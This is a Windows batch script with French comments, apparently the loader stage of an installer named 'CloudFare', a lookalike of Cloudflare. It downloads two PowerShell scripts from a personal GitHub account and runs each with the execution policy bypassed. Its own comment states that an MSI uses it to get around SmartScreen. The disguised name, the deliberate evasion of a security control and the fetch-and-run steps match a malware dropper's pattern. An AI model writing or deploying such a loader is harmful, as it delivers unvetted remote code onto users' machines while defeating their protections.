@echo off
REM CloudFare Installation Batch Orchestrator v1.0
REM Ce fichier batch télécharge et exécute les scripts PowerShell depuis GitHub
REM Utilisé par le MSI pour contourner SmartScreen

setlocal enabledelayedexpansion

title CloudFare Installation

echo.
echo ╔════════════════════════════════════════╗
echo ║  CloudFare Installation Orchestrator   ║
echo ╚════════════════════════════════════════╝
echo.

REM Configuration
set REPO_URL=https://github.com/davidrenand/repos
set RAW_URL=https://raw.githubusercontent.com/davidrenand/repos/main/scripts
set INSTALL_DIR=C:\ProgramData\CloudFare

REM ============================================================================
REM PHASE 1: Télécharger et exécuter Install.ps1
REM ============================================================================

echo [*] Téléchargement du script d'installation...
echo.

REM Créer un répertoire temporaire
if not exist "%TEMP%\CloudFare" mkdir "%TEMP%\CloudFare"

REM Télécharger Install.ps1 depuis GitHub
echo Récupération de Install.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$url = '%RAW_URL%/Install.ps1'; ^
  $output = '%TEMP%\CloudFare\Install.ps1'; ^
  (New-Object Net.WebClient).DownloadFile($url, $output); ^
  Write-Host 'Téléchargé' -F Green"

if !ERRORLEVEL! neq 0 (
  echo.
  echo ╔════════════════════════════════════════╗
  echo ║  ✗ Erreur: Téléchargement échoué      ║
  echo ╚════════════════════════════════════════╝
  echo.
  pause
  exit /b 1
)

echo.
echo [*] Exécution du script d'installation...
echo.

REM Exécuter Install.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\CloudFare\Install.ps1"

if !ERRORLEVEL! neq 0 (
  echo.
  echo ╔════════════════════════════════════════╗
  echo ║  ✗ Erreur: Installation échouée       ║
  echo ╚════════════════════════════════════════╝
  echo.
  pause
  exit /b 1
)

echo.
echo [✓] Installation réussie!
echo.

REM ============================================================================
REM PHASE 2: Télécharger et exécuter Launch.ps1
REM ============================================================================

echo [*] Téléchargement du script de lancement...
echo.

REM Télécharger Launch.ps1 depuis GitHub
echo Récupération de Launch.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$url = '%RAW_URL%/Launch.ps1'; ^
  $output = '%TEMP%\CloudFare\Launch.ps1'; ^
  (New-Object Net.WebClient).DownloadFile($url, $output); ^
  Write-Host 'Téléchargé' -F Green"

if !ERRORLEVEL! neq 0 (
  echo.
  echo [!] Avertissement: Téléchargement Launch.ps1 échoué
  echo.
  pause
  exit /b 0
)

echo.
echo [*] Exécution du script de lancement...
echo.

REM Exécuter Launch.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\CloudFare\Launch.ps1"

echo.
echo [✓] Installation et lancement terminés!
echo.
pause
